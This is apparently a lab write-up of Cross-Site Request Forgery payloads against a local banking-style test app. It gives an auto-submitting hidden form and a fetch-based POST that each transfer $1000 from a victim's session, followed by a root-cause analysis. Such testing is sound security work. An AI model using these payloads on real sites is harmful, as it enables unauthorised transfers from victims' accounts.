# Cross-Site Request Forgery(CSRF) Payloads Documentation

## vulnerability analysis

**target application**: `http://localhost:8000/`

**vulnerability type**: Cross-Site Request Forgery (CSRF)

**attack vector**: Unprotected state-changing POST request to `/transfer`

## successful payloads

### 1. Simple Form Attack

**payload**:

```html
<form action="http://localhost:8080/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**injection point**: External HTML page

**execution context**: Victim's authenticated session

**result**: Successfully transfers $1000 when victim loads the page

### 2. AJAX-based Attack

**payload**:

```html
<script>
  fetch('http://localhost:8080/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'amount=1000'
  });
</script>
```

**injection point**: Malicious website

**execution context**: Background request in victim's browser

**result**: Silent transfer without page reload

## technical analysis

### root cause

the application contains these critical vulnerabilities:

1 - **Missing CSRF Tokens**:

```javascript
app.post('/transfer', (req, res) => {
   // No CSRF token validation
   balance -= req.body.amount;
});
```

2 - **Insecure Cookie Configuration**:

- No `SameSite` attribute
- Missing Secure and HttpOnly flags

3 - **No Origin Verification**:

- Accepts requests from any origin
- No referer header checking

### attack scenarios

#### scenario 1: Account Draining

- **payload**: Full balance transfer form
- **impact**: Complete loss of funds
- **risk level**: critical

#### scenario 2: Phishing Campaign

- **payload**: Hidden iframe with transfer request
- **impact**: Silent transfers when victims read emails
- **risk level**: high

## testing environment

- **browser**: [firefox v140.0.2]
- **date**: [07/08/2025]
- **tester**: [Daniel Trigo - dande-je]
